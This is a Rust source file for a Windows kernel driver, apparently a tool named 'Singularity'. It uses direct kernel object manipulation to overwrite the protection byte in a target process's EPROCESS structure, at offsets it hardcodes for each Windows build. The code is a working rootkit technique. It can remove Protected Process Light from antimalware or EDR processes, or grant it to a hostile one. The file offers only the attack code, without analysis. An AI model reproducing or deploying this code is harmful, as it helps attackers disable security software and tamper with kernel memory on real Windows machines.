use wdk::{nt_success, println};
use wdk_sys::{
    ntddk::{PsLookupProcessByProcessId, RtlGetVersion},
    NTSTATUS, PEPROCESS, RTL_OSVERSIONINFOW, STATUS_NOT_SUPPORTED,
};

/// Resolves the EPROCESS Protection byte offset dynamically by checking the Windows kernel build number.
/// Hardcoding a single offset corrupts adjacent kernel memory and triggers BSODs on differing Windows builds.
fn get_eprocess_protection_offset() -> Result<usize, NTSTATUS> {
    let mut version_info: RTL_OSVERSIONINFOW = unsafe { core::mem::zeroed() };
    version_info.dwOSVersionInfoSize = core::mem::size_of::<RTL_OSVERSIONINFOW>() as u32;

    let status = unsafe { RtlGetVersion(&mut version_info) };
    if !nt_success(status) {
        return Err(status);
    }

    let build = version_info.dwBuildNumber;
    println!("[Singularity::dkom] Detected Windows Build Number: {}", build);

    match build {
        // Windows 11 24H2 (Build 26100+)
        b if b >= 26100 => Ok(0x5FA),
        // Windows 11 21H2 - 23H2 (Build 22000, 22621, 22631)
        22000..=22631 => Ok(0x87A),
        // Windows 10 2004 - 22H2 (Build 19041 - 19045)
        19041..=19045 => Ok(0x87A),
        _ => {
            println!(
                "[Singularity::dkom] Unsupported Windows build for DKOM: {}",
                build
            );
            Err(STATUS_NOT_SUPPORTED)
        }
    }
}

/// Changes the protection level byte of the specified process.
///
/// This function performs Direct Kernel Object Manipulation (DKOM) by locating the `EPROCESS`
/// structure for the target process and directly modifying its protection byte to the
/// value requested by user-mode.
///
/// # Arguments
///
/// * `pid` - The Process ID of the user-mode target to modify.
/// * `level` - The raw protection byte value to apply (e.g., 0x31 for PPL-Antimalware).
///
/// # Errors
///
/// Returns an `NTSTATUS` error code if the process lookup fails, which typically occurs
/// if the PID is invalid or the target process has already terminated.
pub fn change_process_ppl(pid: u32, level: u8) -> Result<(), NTSTATUS> {
    let offset = get_eprocess_protection_offset()?;
    let mut process: PEPROCESS = core::ptr::null_mut();

    // SAFETY: Casting the u32 PID to a HANDLE is the expected FFI pattern for NTOSKRNL.
    // We pass a valid mutable reference to receive the PEPROCESS pointer.
    let status = unsafe { PsLookupProcessByProcessId(pid as _, &mut process) };
    if !nt_success(status) {
        println!(
            "[Singularity::dkom] Failed to lookup PID {}: {:#010X}",
            pid, status
        );
        return Err(status);
    }

    let process_guard = crate::raii::EprocessGuard(process);

    // SAFETY: We hold a valid, reference-counted pointer to the EPROCESS structure.
    // Volatile reads and writes are mandatory here because this memory is actively
    // managed and accessed by the kernel concurrently.
    unsafe {
        let process_base = process_guard.0 as *mut u8;
        let protection_addr = process_base.add(offset);

        let old_value = core::ptr::read_volatile(protection_addr);
        core::ptr::write_volatile(protection_addr, level);

        println!(
            "[Singularity::dkom] Success. PID: {} | Offset: {:#X} | Old: {:#02X} -> New: {:#02X}",
            pid, offset, old_value, level
        );
    }

    Ok(())
}

